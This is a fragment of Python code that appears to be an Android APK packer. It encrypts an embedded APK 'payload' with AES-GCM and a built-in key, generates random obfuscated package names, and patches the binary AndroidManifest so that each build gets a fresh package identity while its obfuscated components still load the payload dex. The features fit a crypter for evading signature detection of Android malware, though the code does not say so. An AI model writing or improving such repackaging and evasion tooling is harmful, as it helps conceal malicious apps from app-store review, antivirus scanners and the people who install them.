_hmac = lambda k, d: hmac.new(k, d, hashlib.sha256).digest()

def hkdf(ikm, salt, kind):
    prk = _hmac(salt, ikm)
    return _hmac(prk, kind + b"\x01")

def pack(apk_bytes, kb_ikm=None, kb_compression=None):
    """Encrypt APK bytes using AES-256-GCM.

    Uses KB patterns if provided, otherwise falls back to defaults.
    Format: [header: 2 bytes (compression_level, flags)] + salt + nonce + ct + tag
    """
    # Use KB patterns or defaults
    ikm = kb_ikm if kb_ikm else IKM
    compression = kb_compression if kb_compression else 9

    salt  = os.urandom(16)
    nonce = os.urandom(12)
    plain = b"\x01" + zlib.compress(apk_bytes, compression)
    key   = hkdf(ikm, salt, KIND)
    cipher= AES.new(key, AES.MODE_GCM, nonce=nonce, mac_len=16)
    cipher.update(salt + KIND)
    ct, tag = cipher.encrypt_and_digest(plain)

    # Header: compression level (1 byte) + reserved (1 byte)
    header = struct.pack("BB", compression & 0xFF, 0x00)
    return header + salt + nonce + ct + tag

def unpack(blob):
    """Decrypt APK blob.

    Supports both new format (with header) and legacy format (no header).
    New format: [header: 2 bytes] + salt(16) + nonce(12) + ct + tag(16)
    Legacy format: salt(16) + nonce(12) + ct + tag(16)
    """
    # Detect format by checking if header is present
    # New format has compression level (1-9) in first byte, legacy has salt[0] which is random
    # We use a heuristic: if first byte looks like a valid compression level (1-9) and
    # second byte is 0, it's likely the new format
    if len(blob) > 2 and 1 <= blob[0] <= 9 and blob[1] == 0x00:
        # New format with header
        header = blob[:2]
        salt, nonce, ct, tag = blob[2:18], blob[18:30], blob[30:-16], blob[-16:]
        key = hkdf(IKM, salt, KIND)
        cipher = AES.new(key, AES.MODE_GCM, nonce=nonce, mac_len=16)
        cipher.update(salt + KIND)
        plain = cipher.decrypt_and_verify(ct, tag)
        if plain[0] & 1:
            plain = zlib.decompress(plain[1:])
        return plain
    else:
        # Legacy format (backward compatible)
        salt, nonce, ct, tag = blob[:16], blob[16:28], blob[28:-16], blob[-16:]
        key = hkdf(IKM, salt, KIND)
        cipher = AES.new(key, AES.MODE_GCM, nonce=nonce, mac_len=16)
        cipher.update(salt + KIND)
        plain = cipher.decrypt_and_verify(ct, tag)
        if plain[0] & 1:
            plain = zlib.decompress(plain[1:])
        return plain

def gen_pkg(length):
    for _ in range(2000):
        try:
            a = random.randint(2, length-5); b = random.randint(2, length-a-4); c = length-a-b-2
        except ValueError:
            continue
        if c < 2:
            continue
        segs = ["".join(random.choice(string.ascii_lowercase+string.digits) for _ in range(n)) for n in (a,b,c)]
        segs = [("x"+s) for s in segs]
        p = ".".join(segs)[:length]
        parts = p.split(".")
        if len(p) == length and all(w and w[0].isalpha() and w.isalnum() for w in parts) and p != OLD_PKG:
            return p

def patch_manifest_pkg(blob: bytes, new_pkg: bytes) -> bytes:
    """Rewrite ONLY the top-level `package` string in a binary AndroidManifest.

    Walks the ResStringPool entries and replaces, in place, the single string
    that is exactly `OLD_PKG` (the manifest package attribute). Component
    names like `wmhfnq.mvicfbs.iydvz` are LONGER strings and are never
    touched - so the launchable activity / service / receiver still resolve to
    the classes actually present in the payload dex. Requires len(new_pkg) ==
    len(OLD_PKG) so pool offsets stay valid.
    """
    assert len(new_pkg) == len(OLD_PKG), "fresh package must be %d chars" % len(OLD_PKG)
    b = bytearray(blob)
    assert int.from_bytes(b[0:2], "little") == 0x0003, "not a string pool"
    string_count = int.from_bytes(b[12:16], "little")
    flags = int.from_bytes(b[20:24], "little")
    strings_start = int.from_bytes(b[24:28], "little")
    is_utf8 = bool(flags & 0x0100)
    old = OLD_PKG.encode()            # 16 UTF-8  bytes
    old16 = OLD_PKG.encode("utf-16-le")   # 32 bytes
    hit = False
    for i in range(string_count):
        off = int.from_bytes(b[28 + i * 4: 32 + i * 4], "little")
        p = strings_start + off
        if is_utf8:
            v = b[p]
            if v & 0x80:
                char_len = ((v & 0x7F) << 8) | b[p + 1]; p += 2
            else:
                char_len = v; p += 1
            v = b[p]
            if v & 0x80:
                byte_len = ((v & 0x7F) << 8) | b[p + 1]; p += 2
            else:
                byte_len = v; p += 1
            if byte_len == len(old) and b[p:p + byte_len] == old:
                b[p:p + byte_len] = new_pkg; hit = True
        else:
            v = int.from_bytes(b[p:p + 2], "little")
            if v & 0x8000:
                char_len = ((v & 0x7FFF) << 16) | int.from_bytes(b[p + 2:p + 4], "little")
                p += 4
            else:
                char_len = v; p += 2
            byte_len = char_len * 2
            if byte_len == len(old16) and b[p:p + byte_len] == old16:
                b[p:p + byte_len] = new_pkg.encode("utf-16-le"); hit = True
    if not hit:
        raise SystemExit("RELOC: package string %r not found in manifest pool" % OLD_PKG)
    return bytes(b)


def relabel(new_pkg):
    assert len(new_pkg) == len(OLD_PKG)
    out = {}
    for n, meta in TEMPL.items():
        if n != "AndroidManifest.xml":
            out[n] = meta
            continue
        d = base64.b64decode(meta["d"])
        d = patch_manifest_pkg(d, new_pkg.encode())
        out[n] = dict(meta, d=base64.b64encode(d).decode())
    return out

def run(cmd, cwd=None):
    if os.name == "nt" and cmd[0].endswith(".bat"):
        cmd = ["cmd", "/c"] + cmd
    p = subprocess.run(cmd, capture_output=True, text=True, cwd=cwd)
    if p.returncode != 0:
        sys.stderr.write("CMD FAILED: %s\n%s%s" % (" ".join(cmd), p.stdout, p.stderr))
        raise SystemExit(1)
    return p

